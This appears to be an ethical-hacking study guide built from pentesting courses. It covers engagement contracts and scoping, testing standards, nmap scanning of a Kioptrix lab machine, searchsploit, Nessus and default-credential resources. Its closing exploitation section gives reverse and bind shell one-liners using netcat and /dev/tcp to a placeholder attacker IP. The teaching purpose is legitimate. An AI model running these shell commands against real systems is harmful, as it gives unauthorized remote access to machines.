# Ethical-Hacking


# Introduction

*This chapter (Ethical Hacking General Methodology) aims to present the stages in Ethical hacking. Each step will be presented individually.
This documentation has been made using **The Cyber Mentor PEH course**, **HTB Academy Penetration Testing job skill path** and **XSSrat Pentesting 101 ultimate guide from start to finish**.  
I recommend all these courses as they really cover very important topics of pentest and also offer the possibility to practice these skills.
Also they offer the possibility to get certified with an exam.  
[PNPT for TCM](https://certifications.tcm-sec.com/pnpt/), [HTB CPTS](https://academy.hackthebox.com/preview/certifications/htb-certified-penetration-testing-specialist/)* and [XSSrat for CNWPP](https://thexssrat.podia.com/cnwpp)

## Ethical hacking methodology

When working for any company, make sure that you have a copy of the signed scope of work/contract and a formal document listing the scope of testing (URLs, individual IP addresses, CIDR network ranges, wireless SSIDs, facilities for a physical assessment, or lists of email or phone numbers for social engineering engagements), also signed by the client.  
When in doubt, request additional approvals and documentation before beginning any testing. While performing testing, stay within the scope of testing.  
Do not stray from the scope if you notice other IP addresses or subdomains that look more interesting.  
Again, if in doubt, reach out. Perhaps the client forgot to add certain hosts to the scoping sheet. It does not hurt to reach out and ask if other hosts you notice should be included, but, again, make sure this is in writing and not just given on a phone call.  
We must work with the guiding principle of do no harm and strive to perform all testing activities in a careful and measured way. Just because we can run a certain tool, should we? Could a particular exploit PoC potentially crash one or more servers? If in doubt about anything during an assessment, run it by your manager and the client and gain explicit consent in writing before proceeding.

![Five stages of ethical hacking](https://user-images.githubusercontent.com/96747355/175700182-319869ae-3077-435b-a875-1a991103e7a5.png)  

> *Source: [Practical Ethical Hacking - TCM Security](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)*

> *Source: [Hackethebox Academy](https://academy.hackthebox.com/login)*

## Precautionary Measure during Pentests

- [ ] Obtain written consent from the owner or authorized representative of the computer or network being tested
- [ ] Conduct the testing within the scope of the consent obtained only and respect any limitations specified
- [ ] Take measures to prevent causing damage to the systems or networks being tested
- [ ] Do not access, use or disclose personal data or any other information obtained during the testing without permission
- [ ] Do not intercept electronic communications without the consent of one of the parties to the communication
- [ ] Do not conduct testing on systems or networks that are covered by the Health Insurance Portability and Accountability Act (HIPAA) without proper authorization

In addition, we should also be aware that some countries have additional regulations that apply to specific cases, and we should either inform ourselves or ask our lawyer.

> *Source HackTheBox Academy*

## Common Legal Documents

![image](https://user-images.githubusercontent.com/96747355/176043879-548a35d5-d933-46ac-9b9f-e6c210324dc7.png)  

> *Source: [Practical Ethical Hacking - TCM Security](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)*



- [Example of Master Service Agreement](https://www.rapid7.com/legal/msa/)

> **Note:** Our client may provide a separate scoping document listing in-scope IP addresses/ranges/URLs and any necessary credentials but this information should also be documented as an appendix in the RoE document.  
> **Important Note:**  
> These documents should be reviewed and adapted by a lawyer after they have been prepared.

## Pre-Engagement

The pre-engagement stage is where the main commitments, tasks, scope, limitations, and related agreements are documented in writing. During this stage, contractual documents are drawn up, and essential information is exchanged that is relevant for penetration testers and the client, depending on the type of assessment.
Arrengements are made for:

- Non-Disclosure Agreement
- Goals
- Scope
- Time Estimation
- Rules of Engagement

The entire pre-engagement process consists of three essential components:

1. Scoping questionnaire
2. Pre-engagement meeting
3. Kick-off meeting

Before any of these can be discussed in detail, a Non-Disclosure Agreement (NDA) must be signed by all parties. There are several types of NDAs:

|Type|Description|
|----|-----------|
|Unilateral NDA|This type of NDA obligates only one party to maintain confidentiality and allows the other party to share the information received with third parties.|
|Bilateral NDA|In this type, both parties are obligated to keep the resulting and acquired information confidential. This is the most common type of NDA that protects the work of penetration testers.|
|Multilateral NDA|Multilateral NDA is a commitment to confidentiality by more than two parties. If we conduct a penetration test for a cooperative network, all parties responsible and involved must sign this document.|

It is essential to know who in the company is permitted to contract us for a penetration test. Because we cannot accept such an order from everyone. Imagine, for example, that a company employee hires us with the pretext of checking the corporate network's security. However, after we finished the assessment, it turned out that this employee wanted to harm their own company and had no authorization to have the company tested. This would put us in a critical situation from a legal point of view.  

Non exhaustive list of company members who may be authorized to hire us for penetration testing:  

- Chief Executive Officer (CEO)
- Chief Technical Officer (CTO)
- Chief Information Security Officer (CISO)
- Chief Security Officer (CSO)
- Chief Risk Officer (CRO)
- Chief Information Officer (CIO)
- VP of Internal Audit
- Audit Manager
- VP or Director of IT/Information Security

### Scoping Questionnaire

After initial contact is made with the client, we typically send them a Scoping Questionnaire to better understand the services they are seeking. This scoping questionnaire should clearly explain our services and may typically ask them to choose one or more from the following list:  

- Internal Vulnerability Assessment
- External Vulnerability Assessment
- Internal Penetration Test
- External Penetration Test
- Wireless Security Assessment
- Application Security Assessment
- Physical Security Assessment
- Social Engineering Assessment
- Red Team Assessment
- Web Application Security Assessment

Under each of these, the questionnaire should allow the client to be more specific about the required assessment.
Aside from the assessment type, client name, address, and key personnel contact information, some other critical pieces of information include:

- How many expected live hosts?
- How many IPs/CIDR ranges in scope?
- How many Domains/Subdomains are in scope?
- How many wireless SSIDs in scope?
- How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)?
- For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT?
- If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed?
- What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope?
- Is a separate Active Directory Security Assessment desired?
- Will network testing be conducted from an anonymous user on the network or a standard domain user?
- Do we need to bypass Network Access Control (NAC)?

Finally, we will want to ask about information disclosure and evasiveness (if applicable to the assessment type):

- Is the Penetration Test black box (no information provided), grey box (only IP address/CIDR ranges/URLs provided), white box (detailed information provided)
- Would they like us to test from a non-evasive, hybrid-evasive (start quiet and gradually become "louder" to assess at what level the client's security personnel detect our activities), or fully evasive.

Based on the information we received from the scoping questionnaire, we create an overview and summarize all information in the Scoping Document.  

### Pre-Engagement Meeting

Once we have an initial idea of the client's project requirements, we can move on to the pre-engagement meeting. This meeting discusses all relevant and essential components with the customer before the penetration test, explaining them to our customer. The information we gather during this phase, along with the data collected from the scoping questionnaire, will serve as inputs to the Penetration Testing Proposal, also known as the Contract or Scope of Work (SoW).

#### Contract - Checklist

- [ ] NDA  
Non-Disclosure Agreement (NDA) refers to a secrecy contract between the client and the contractor regarding all written or verbal information concerning an order/project. The contractor agrees to treat all confidential information brought to its attention as strictly confidential, even after the order/project is completed. Furthermore, any exceptions to confidentiality, the transferability of rights and obligations, and contractual penalties shall be stipulated in the agreement. The NDA should be signed before the kick-off meeting or at the latest during the meeting before any information is discussed in detail.
- [ ] Goals  
Goals are milestones that must be achieved during the order/project. In this process, goal setting is started with the significant goals and continued with fine-grained and small ones.
- [ ] Scope  
The individual components to be tested are discussed and defined. These may include domains, IP ranges, individual hosts, specific accounts, security systems, etc. Our customers may expect us to find out one or the other point by ourselves. However, the legal basis for testing the individual components has the highest priority here.
- [ ] Penetration Testing Type  
When choosing the type of penetration test, we present the individual options and explain the advantages and disadvantages. Since we already know the goals and scope of our customers, we can and should also make a recommendation on what we advise and justify our recommendation accordingly. Which type is used in the end is the client's decision.
- [ ] Methodologies  
Examples: OSSTMM, OWASP, automated and manual unauthenticated analysis of the internal and external network components, vulnerability assessments of network components and web applications, vulnerability threat vectorization, verification and exploitation, and exploit development to facilitate evasion techniques.
- [ ] Penetration Testing Locations  
External: Remote (via secure VPN) and/or Internal: Internal or Remote (via secure VPN)
- [ ] Time Estimation  
For the time estimation, we need the start and the end date for the penetration test. This gives us a precise time window to perform the test and helps us plan our procedure. It is also vital to explicitly ask how time windows the individual attacks (Exploitation / Post-Exploitation / Lateral Movement) are to be carried out. These can be carried out during or outside regular working hours. When testing outside regular working hours, the focus is more on the security solutions and systems that should withstand our attacks.
- [ ] Third Parties  
For the third parties, it must be determined via which third-party providers our customer obtains services. These can be cloud providers, ISPs, and other hosting providers. Our client must obtain written consent from these providers describing that they agree and are aware that certain parts of their service will be subject to a simulated hacking attack. It is also highly advisable to require the contractor to forward the third-party permission sent to us so that we have actual confirmation that this permission has indeed been obtained.
- [ ] Evasive Testing  
Evasive testing is the test of evading and passing security traffic and security systems in the customer's infrastructure. We look for techniques that allow us to find out information about the internal components and attack them. It depends on whether our contractor wants us to use such techniques or not.
- [ ] Risks  
We must also inform our client about the risks involved in the tests and the possible consequences. Based on the risks and their potential severity, we can then set the limitations together and take certain precautions.
- [ ] Scope Limitations & Restrictions  
It is also essential to determine which servers, workstations, or other network components are essential for the client's proper functioning and its customers. We will have to avoid these and must not influence them any further, as this could lead to critical technical errors that could also affect our client's customers in production.
- [ ] Information Handling  
HIPAA, PCI, HITRUST, FISMA/NIST, etc.
- [ ] Contact Information  
For the contact information, we need to create a list of each person's name, title, job title, e-mail address, phone number, office phone number, and an escalation priority order.
- [ ] Lines of Communication  
It should also be documented which communication channels are used to exchange information between the customer and us. This may involve e-mail correspondence, telephone calls, or personal meetings.
- [ ] Reporting  
Apart from the report's structure, any customer-specific requirements the report should contain are also discussed. In addition, we clarify how the reporting is to take place and whether a presentation of the results is desired.
- [ ] Payment Terms  
Finally, prices and the terms of payment are explained.

Based on the Contract checklist and the input information shared in scoping, the Penetration Testing Proposal (Contract) and the associated Rules of Engagement (RoE) are created.

#### Rules of Engagement - Checklist

- [ ] Introduction  
Description of this document.
- [ ] Contractor  
Company name, contractor full name, job title.
- [ ] Penetration Testers  
Company name, pentesters full name.
- [ ] Contact Information  
Mailing addresses, e-mail addresses, and phone numbers of all client parties and penetration testers.
- [ ] Purpose  
Description of the purpose for the conducted penetration test.
- [ ] Goals  
Description of the goals that should be achieved with the penetration test.
- [ ] Scope  
All IPs, domain names, URLs, or CIDR ranges.
- [ ] Lines of Communication  
Online conferences or phone calls or face-to-face meetings, or via e-mail.
- [ ] Time Estimation  
Start and end dates.
- [ ] Time of the Day to Test  
Times of the day to test.
- [ ] Penetration Testing Type  
External/Internal Penetration Test/Vulnerability Assessments/Social Engineering.
- [ ] Penetration Testing Locations  
Description of how the connection to the client network is established.
- [ ] Methodologies  
OSSTMM, PTES, OWASP, and others.
- [ ] Objectives / Flags  
Users, specific files, specific information, and others.
- [ ] Evidence Handling  
Encryption, secure protocols
- [ ] System Backups  
Configuration files, databases, and others.
- [ ] Information Handling  
Strong data encryption
- [ ] Incident Handling and Reporting  
Cases for contact, pentest interruptions, type of reports
- [ ] Status Meetings  
Frequency of meetings, dates, times, included parties
- [ ] Reporting  
Type, target readers, focus
- [ ] Retesting  
Start and end dates
- [ ] Disclaimers and Limitation of Liability  
System damage, data loss
- [ ] Permission to Test  
Signed contract, contractors agreement

### Contractors Agreement

If the penetration test also includes physical testing, then an additional contractor's agreement is required. Since it is not only a virtual environment but also a physical intrusion, completely different laws apply here.  
It is also possible that many of the employees have not been informed about the test. Suppose we encounter employees with a very high-security awareness during the physical attack and social engineering attempts, and we get caught. In that case, the employees will, in most cases, contact the police. This additional contractor's agreement is our "get out of jail free card" in this case.

#### Contractors Agreement - Checklist for Physical Assessments

- [ ] Introduction
- [ ] Contractor
- [ ] Purpose
- [ ] Goal
- [ ] Penetration Testers
- [ ] Contact Information
- [ ] Physical Addresses
- [ ] Building Name
- [ ] Floors
- [ ] Physical Room Identifications
- [ ] Physical Components
- [ ] Timeline
- [ ] Notarization
- [ ] Permission to Test

> *Source Hackthebox Academy*

## Types of Pentests

|Type|Information Provided|
|----|--------------------|
|Blackbox|Minimal. Only the essential information, such as IP addresses and domains, is provided.|
|Greybox|Extended. In this case, we are provided with additional information, such as specific URLs, hostnames, subnets, and similar.|
|Whitebox|Maximum. Here everything is disclosed to us. This gives us an internal view of the entire structure, which allows us to prepare an attack using internal information. We may be given detailed configurations, admin credentials, web application source code, etc.|
|Red-Teaming|May include physical testing and social engineering, among other things. Can be combined with any of the above types.|
|Purple-Teaming|It can be combined with any of the above types. However, it focuses on working closely with the defenders.|

> *Source HTB Academy*

## Types of Testing Environmments

- Network
- Web App
- Mobile
- API
- Thick Clients
- IoT
- Cloud
- Source Code
- Physical Security
- Employees
- Hosts
- Server
- Security Policies
- Firewalls
- IDS/IPS

> It is important to note that these categories can often be mixed. All listed test components may be included depending on the type of test to be performed  
> *Source HTB Academy*

## Checklists

- You can use multiple checklists during your engagements
- [OWASP Checklist](https://github.com/0xRadi/OWASP-Web-Checklist)
- Along with OWASP checklist you can use [the testing guide](https://owasp.org/www-project-web-security-testing-guide/stable/)
- [NetbiosX Red Teaming & Pentesting checklists for various engagements](https://github.com/netbiosX/Checklists)

## Asset Management

When an organization of any kind, in any industry, and of any size needs to plan their cybersecurity strategy, they should start by creating an inventory of their data assets. If you want to protect something, you must first know what you are protecting! Once assets have been inventoried, then you can start the process of asset management. This is a key concept in defensive security.

### Asset Inventory

Asset inventory is a critical component of vulnerability management. An organization needs to understand what assets are in its network to provide the proper protection and set up appropriate defenses. The asset inventory should include information technology, operational technology, physical, software, mobile, and development assets. Organizations can utilize asset management tools to keep track of assets. The assets should have data classifications to ensure adequate security and access controls.

#### Application and System Inventory

An organization should create a thorough and complete inventory of data assets for proper asset management for defensive security. Data assets include:

- All data stored on-premises. HDDs and SSDs in endpoints (PCs and mobile devices), HDDs & SSDs in servers, external drives in the local network, optical media (DVDs, Blu-ray discs, CDs), flash media (USB sticks, SD cards). Legacy technology may include floppy disks, ZIP drives (a relic from the 1990s), and tape drives.

- All of the data storage that their cloud provider possesses. Amazon Web Services (AWS), Google Cloud Platform (GCP), and Microsoft Azure are some of the most popular cloud providers, but there are many more. Sometimes corporate networks are "multi-cloud," meaning they have more than one cloud provider. A company's cloud provider will provide tools that can be used to inventory all of the data stored by that particular cloud provider.

- All data stored within various Software-as-a-Service (SaaS) applications. This data is also "in the cloud" but might not all be within the scope of a corporate cloud provider account. These are often consumer services or the "business" version of those services. Think of online services such as Google Drive, Dropbox, Microsoft Teams, Apple iCloud, Adobe Creative Suite, Microsoft Office 365, Google Docs, and the list goes on.

- All of the applications a company needs to use to conduct their usual operation and business. Including applications that are deployed locally and applications that are deployed through the cloud or are otherwise Software-as-a-Service.

- All of a company's on-premises computer networking devices. These include but aren't limited to routers, firewalls, hubs, switches, dedicated intrusion detection and prevention systems (IDS/IPS), data loss prevention (DLP) systems, and so on.

All of these assets are very important. A threat actor or any other sort of risk to any of these assets can do significant damage to a company's information security and ability to operate day by day. An organization needs to take its time to assess everything and be careful not to miss a single data asset, or they won't be able to protect it.

Organizations frequently add or remove computers, data storage, cloud server capacity, or other data assets. Whenever data assets are added or removed, this must be thoroughly noted in the data asset inventory.

## Compliance Standards

### PCI DSS

The [Payment Card Industry Data Security Standard (PCI DSS)](https://www.pcisecuritystandards.org/about_us/) is a commonly known standard in information security that implements requirements for organizations that handle credit cards. As per government regulations, organizations that store, process, or transmit cardholder data must implement PCI DSS guidelines. This would include banks or online stores that handle their own payment solutions (e.g., Amazon).

PCI DSS requirements include internal and external scanning of assets. For example, any credit card data that is being processed or transmitted must be done in a Cardholder Data Environment (CDE). The CDE environment must be adequately segmented from normal assets. CDE environments are segmented off from an organization's regular environment to protect any cardholder data from being compromised during an attack and limit internal access to data.



### Health Insurance Portability and Accountability Act (HIPAA)

HIPAA is the [Health Insurance Portability and Accountability Act](https://www.hipaa.com/), which is used to protect patients' data. HIPAA does not necessarily require vulnerability scans or assessments; however, a risk assessment and vulnerability identification are required to maintain HIPAA accreditation.

### Federal Information Security Management Act (FISMA)

[The Federal Information Security Management Act (FISMA)](https://www.cisa.gov/federal-information-security-modernization-act) is a set of standards and guidelines used to safeguard government operations and information. The act requires an organization to provide documentation and proof of a vulnerability management program to maintain information technology systems' proper availability, confidentiality, and integrity.

### ISO 27001

[ISO 27001](https://www.iso.org/isoiec-27001-information-security.html) is a standard used worldwide to manage information security. ISO 27001 requires organizations to perform quarterly external and internal scans.

Although compliance is essential, it should not drive a vulnerability management program. Vulnerability management should consider the uniqueness of an environment and the associated risk appetite to an organization.

The International Organization for Standardization (ISO) maintains technical standards for pretty much anything you can imagine. The ISO 27001 standard deals with information security. ISO 27001 compliance depends upon maintaining an effective Information Security Management System. To ensure compliance, organizations must perform penetration tests in a carefully designed way.

## Penetration Testing Standards

Penetration tests should not be performed without any rules or guidelines. There must always be a specifically defined scope for a pentest, and the owner of a network must have a signed legal contract with pentesters outlining what they're allowed to do and what they're not allowed to do. Pentesting should also be conducted in such a way that minimal harm is done to a company's computers and networks. Penetration testers should avoid making changes wherever possible (such as changing an account password) and limit the amount of data removed from a client's network. For example, instead of removing sensitive documents from a file share, a screenshot of the folder names should suffice to prove the risk.

In addition to scope and legalities, there are also various pentesting standards, depending on what kind of computer system is being assessed. Here are some of the more common standards you may use as a pentester.

### PTES

The [Penetration Testing Execution Standard (PTES)](http://www.pentest-standard.org/index.php/Main_Page) can be applied to all types of penetration tests. It outlines the phases of a penetration test and how they should be conducted. These are the sections in the PTES:

- Pre-engagement Interactions
- Intelligence Gathering
- Threat Modeling
- Vulnerability Analysis
- Exploitation
- Post Exploitation
- Reporting

### OSSTMM

OSSTMM is the Open Source Security Testing Methodology Manual, another set of guidelines pentesters can use to ensure they're doing their jobs properly. It can be used alongside other pentest standards.

[OSSTMM](https://www.isecom.org/OSSTMM.3.pdf) is divided into five different channels for five different areas of pentesting:

1. Human Security (human beings are subject to social engineering exploits)
2. Physical Security
3. Wireless Communications (including but not limited to technologies like WiFi and Bluetooth)
4. Telecommunications
5. Data Networks

### NIST

The NIST (National Institute of Standards and Technology) is well known for their [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework), a system for designing incident response policies and procedures. NIST also has a Penetration Testing Framework. The phases of the NIST framework include:

- Planning
- Discovery
- Attack
- Reporting

### OWASP

OWASP stands for the [Open Web Application Security Project](https://owasp.org/). They're typically the go-to organization for defining testing standards and classifying risks to web applications.

OWASP maintains a few different standards and helpful guides for assessment various technologies:

- [Web Security Testing Guide (WSTG)](https://owasp.org/www-project-web-security-testing-guide/)
- [Mobile Security Testing Guide (MASTG)](https://owasp.org/www-project-mobile-app-security/)
- [Firmware Security Testing Methodology](https://github.com/scriptingxss/owasp-fstm)

## Resources

- Here is a great methodology with plenty of resources  
- https://bitvijays.github.io/LFC-VulnerableMachines.html#ctf-series-vulnerable-machines
- https://uppusaikiran.github.io/hacking/Capture-the-Flag-CheatSheet/

- HTB Machines search on engine for practice on specific topics

- https://htbmachines.github.io/
- https://ippsec.rocks/
- https://www.hackthebox.com/machines

- This search engine will help you find HTB Academy modules according to specific goals you have for HTB platform. For instance if you want to work on dante prolab you will have suggestions of HTB Academy modules according to the topics of Dante:

- https://academy.hackthebox.com/academy-lab-relations





# Information Gathering

Next, we move towards the Information Gathering stage. Before any target systems can be examined and attacked, we must first identify them. It may well be that the customer will not give us any information about their network and components other than a domain name or just a listing of in-scope IP addresses/network ranges. Therefore, we need to get an overview of the target web application(s) or network before proceeding further.

- Reconnaissance can be passive or active. Check out this [article](https://www.securitymadesimple.org/cybersecurity-blog/active-vs-passive-cyber-reconnaissance-in-information-security) that explains this difference very well

### Physical / Social

- Location Information: Satellite images, Drone recon, Building layout
- Job information: Employees, Pictures

### Web / Host

![image](https://user-images.githubusercontent.com/96747355/175716537-7139593e-5620-44e5-b194-98495a32c207.png)  

> *Source: [Practical Ethical Hacking - TCM Security](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)*

## Identifying our target

*In the case of bug hunting we will have a document with detailed information on what is in scope and what is out of scope. We have to take very good notes of these to be sure to not make any mistakes.  
In the case of a pentest it will be defined in the document called **Rules of Engagement***  

## Discovering email address

- Email OSINT

## Gathering breached credentials

- Password OSINT

## Web information Gathering

- Website OSINT

## Using search engines

- OSINT Search Engines

## Using Social Media

- Social Media OSINT

## Tools

- OSINT / Recon 






# Scanning and Enumeration

AKA Vulnerability Assessment.  
In this step we use the information found to identify potential weaknesses. We can use vulnerability scanners that will scan the target systems for known vulnerabilities and manual analysis where we try to look behind the scenes to discover where the potential vulnerabilities might lie.  
Time, patience, and personal commitment all play a significant role in information gathering. This is when many penetration testers tend to jump straight into exploiting a potential vulnerability. This often fails and can lead, among other things, to a significant loss of time. Before attempting to exploit anything, we should have completed thorough information gathering, keeping detailed notes along the way, focusing on things to hone in on once we get to the exploitation stage. Most assessments are time-based, so we don't want to waste time bouncing around, which could lead to us missing something critical. Organization and patience are vital while being as thorough as possible.  
In other terms, we analyze the results from our Information Gathering stage, looking for known vulnerabilities in the systems, applications, and various versions of each to discover possible attack vectors. Vulnerability assessment is the evaluation of potential vulnerabilities, both manually and through automated means. This is used to determine the threat level and the susceptibility of a company's network infrastructure to cyber-attacks.  
*Source Hackthebox Academy*

- The machine used in the lab here for the example is Kioptrix from vulnhub
- During this stage it is really important to take good notes. We have to write versions we find any information disclosed during this phase.

## Scanning with nmap

### Identify all the machines in a network

- `netdiscover -r 10.0.2.0/24`  
  
![image](https://user-images.githubusercontent.com/96747355/175752002-a1ad3fc9-ed96-4076-837d-d14d2c293113.png)  

### Scan with Nmap

- `nmap -Pn -sV -sC -p- 10.0.2.80` my fav scan options (if I do not need to be stealthy)
- We can use the `-sS` flag it is suppose to be stealthy (it is much more picked up today than it used to be). It is called stealthy because it is going to send SYN and when it will receive the SYNACK it will send a RST instead of an ACK (it means that when the remote machine is going to say "I am open you can connect" it is going to send something like "I do not want to connect anymore")
- `nmap -T4 -p- -A 10.0.2.4`
- `nmap -sU -T4 -p 10.0.2.4` In case we want to scan udp it is better to make a scan similar to this one because udp takes a long time to scan

### Result

- Here is the result from our example
```
┌──(root💀kali)-[~]
└─# nmap -T4 -p- -A 10.0.2.4                                                                                                                                                                                                           130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 21:09 EDT
Nmap scan report for 10.0.2.4
Host is up (0.00081s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: SKMYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2022-06-25T05:10:01+00:00; +3h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
|_http-title: 400 Bad Request
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:4B:3D:CA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: 3h59m58s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.81 ms 10.0.2.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.74 seconds
```

## Enumeration

Next step is to enumerate the services and protocols that showed up in our nmap scan.  
It is really important to take detailed not during this process.  
For more info about this checkout [the networking chapter](https://csbygb.gitbook.io/pentips/networking/).  
You will find steps for multiple protocols and services.

### Questions to ask ourselves during enumeration

- What can we see?
- What reasons can we have for seeing it?
- What image does what we see create for us?
- What do we gain from it?
- How can we use it?
- What can we not see?
- What reasons can there be that we do not see?
- What image results for us from what we do not see?  
*Source Hackthebox Academy*

### Principles

|No.|Principle|
|---|---------|
|1.|There is more than meets the eye. Consider all points of view.|
|2.|Distinguish between what we see and what we do not see.|
|3.|There are always ways to gain more information. Understand the target.|

*Source Hackthebox Academy*

## Research

- After this enumeration we can look up things we wrote down in our notes (vulnerable versions, vulnerable services, misconfigurations,...).

### Search Engines

- Usually we can try to google `technology version exploit` for example `mod_ssl 2.8.4 exploit` If anything shows up we can add it in our notes along with link to exploits to try them out later

### searchsploit

- `sudo apt install exploitdb -y` to install
- On kali we can use searchsploit `searchsploit technology partial-version` for example `searchsploit Samba 2` or `searchsploit Samba`
- Example `searchsploit drupal 7.54` You will then get a list of exploits or Metasploit modules  


- To download an exploit you then just need to do `searchsploit -m 46459 .` with:
  - `46459` name of the exploit (here we took the last one from the screen above)
  - `.` the path to the folder you want to copy it to  


## Vulnerability Sanning with Nessus

- Get it [here](https://www.tenable.com/downloads/nessus?loginAttempted=true)
- `dpkg -i Nessus-10.2.0-ubuntu1110_amd64.deb` install it
- `/bin/systemctl start nessusd.service` start the service
- Then we go to https://127.0.0.1:8834/ to finish the install and configure it
- If you are in the login page you can find out which username is installed with `/opt/nessus/sbin/nessuscli lsuser`
- You can then change your password with `/opt/nessus/sbin/nessuscli chpasswd username`
- If you are in the setup it is going to ask which version, you need to choose essentials (this version is free and will allow you to scan only private IP address) and then you will be able to register a user.
- Here is and example of scan result (we ordered the vuln by severity by choosing disable groups in the settings wheel)  
![image](https://user-images.githubusercontent.com/96747355/175835352-16616ab5-4784-48da-80f8-37641bcca200.png)  
- We can then check the vulns out and see if we can exploit them.

## Default Credentials

- If you stumble accross a login platform, first thing to try would be default creds.  
Here are some useful links for this
- [Default Creds CheatSheet - Ihebski](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
- [Passwords - CIRT](https://cirt.net/passwords)
- [Default Creds - Seclists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
- [Data Recovery](https://datarecovery.com/rd/default-passwords/)

## Weak Credentials

- [Passwords - Seclists](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
- [Wikipedia Most Common Password](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)

## Possible paths after this step

|Path | Description |
|-----|-------------|
|Exploitation |The first we can jump into is the Exploitation stage. This happens when we do not yet have access to a system or application. Of course, this assumes that we have already identified at least one gap and prepared everything necessary to attempt to exploit it.|
|Post-Exploitation| The second way leads to the Post-Exploitation stage, where we escalate privileges on the target system. This assumes that we are already on the target system and can interact with it.|
|Lateral Movement|Our third option is the Lateral Movement stage, where we move from the already exploited system through the network and attack other systems. Again, this assumes that we are already on a target system and can interact with it. However, privilege escalation is not strictly necessary because interacting with the system already allows us to move further in the network under certain circumstances. Other times we will need to escalate privileges before moving laterally. Every assessment is different.|
|Information Gathering| The last option is returning to the Information Gathering stage when we do not have enough information on hand. Here we can dig deeper to find more information that will give us a more accurate view.|

> *Source: Hackthebox Academy*

## Resources

- https://academy.hackthebox.com/login

### General resources about enumeration

- https://medium.com/@nclvnp/enumeration-1976c5d55b1b




# Exploitation (Basics)

Exploitation is the attack performed against a system or application based on the potential vulnerability discovered during our information gathering and enumeration.  
We use the information from the Information Gathering stage, analyze it in the Vulnerability Assessment stage, and prepare the potential attacks.  
Often many companies and systems use the same applications but make different decisions about their configuration.  
This is because the same application can often be used for various purposes, and each organization will have different objectives.  

> *Source: Hackthebox Academy*

## Shells

### Reverse shell

![image](https://user-images.githubusercontent.com/96747355/175835538-b00ec472-e4b3-4688-b062-25d37837b8b1.png)  

> *Source:[hackingtutorials.org](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)*

- The target connects back to us. Initiates a connection back to a "listener" on our attack box.
- Example
  - in our attacking machine we type `nc -nlvp 4444` (4444 is the port) 
  - in our target we connect be. For instance in case of a linux based machine we can do `netcat ATTACKING-MACHINE-IP 4444 -e /bin/bash` we could also use `/bin/bash -i >& /dev/tcp/ATTACKING-MACHINE-IP/4444 0>&1`

### Bind shell

![image](https://user-images.githubusercontent.com/96747355/175835567-7bb7a51d-7761-4cc8-983a-cc7087dacaac.png)  

> *Source:[hackingtutorials.org](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)*

- We connect to the target. "Binds" to a specific port on the target host and waits for a connection from our attack box.
- Example
  - in our target we can do `nc -nlvp 4444 -e /bin/bash`
  - in our attacking machine we can do `nc TARGET-IP 4444`

### Web shell

- Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command.
